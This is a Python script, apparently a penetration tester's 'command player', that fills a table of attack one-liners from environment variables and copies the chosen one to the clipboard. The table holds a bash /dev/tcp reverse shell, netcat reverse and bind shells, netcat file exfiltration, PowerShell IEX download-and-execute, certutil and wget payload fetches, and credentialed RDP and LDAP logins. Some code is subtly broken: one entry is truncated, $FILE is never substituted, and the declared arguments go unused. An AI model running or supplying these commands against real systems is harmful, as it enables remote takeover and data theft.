#!/usr/bin/env python3

import argparse
import os
import re
from re import match
from subprocess import Popen, PIPE
from dotenv import load_dotenv

Commands = {
    "bash": "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
    "certutil": "certutil -urlcache -split -f http://$LHOST/$FILE",
    "curl": "curl -OL http://$LHOST/$FILE",
    "http": "http://$LHOST/$FILE",
    "msfvenom": "msfvenom LHOST=$LHOST LPORT=$LPORT",
    "nc-bind": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/",
    "nc-file": "nc -w 3 $LHOST $LPORT < $FILE",
    "nc-rev": "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f",
    "ps-dl": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
    "ps-ex": "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/$FILE')\"",
    "ps-wget": "wget -OutFile $FILE http://$LHOST/$FILE",
    "wget": "wget http://$LHOST/$FILE",
    "xfreerdp": "xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:$RHOST /u:\"$DOMAIN\\$UN\" /p:\"$PW\"",
    "nxc-ldap": "netexec ldap $FQDN -u \"$UN\" -p \"$PW\"",
}


def replace(input, vars):
    output = input
    for key in vars.keys():
        output = output.replace(key, vars[key])
    return output


def show_menu(vars):
    print("Available commands:")
    for i, key in enumerate(Commands.keys()):
        print(f"{i}) {key : <20} : {replace(Commands[key], vars)}")


def load_vars():
    load_dotenv("./.env")
    list = (
        "LHOST",
        "LPORT",
        "RHOST",
        "DOMAIN",
        "FQDN",
        "UN",
        "PW",
    )
    vars = {}
    for var in list:
        vars[f"${var}"] = os.environ.get(var, "")
    return vars


def main(args):

    output = ""

    vars = load_vars()

    cmd = args.cmd
    if cmd == "":
        show_menu(vars)
        choice = input("\nChoose a command to play: ")
        if choice == "":
            return
        cmd = list(Commands.keys())[int(choice)]
    if cmd:
        if cmd in Commands:
            output = replace(Commands[cmd], vars)
            p1 = Popen(["xclip", "-selection", "clipboard", "-f"], stdin=PIPE)
            p1.communicate(input=(output.encode()))
        else:
            print("Command not found")
    else:
        parser.print_help()


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Command player")
    parser.add_argument("-f", "--file", default="", dest="file", action="store", type=str, help="File name")
    parser.add_argument("-u", "--user", default="", dest="user", action="store", type=str, help="Username")
    parser.add_argument("-p", "--password", default="", dest="password", action="store", type=str, help="Password")
    parser.add_argument("cmd", default="", nargs="?", type=str, help="Choose a command to play")
    args = parser.parse_args()
    main(args)
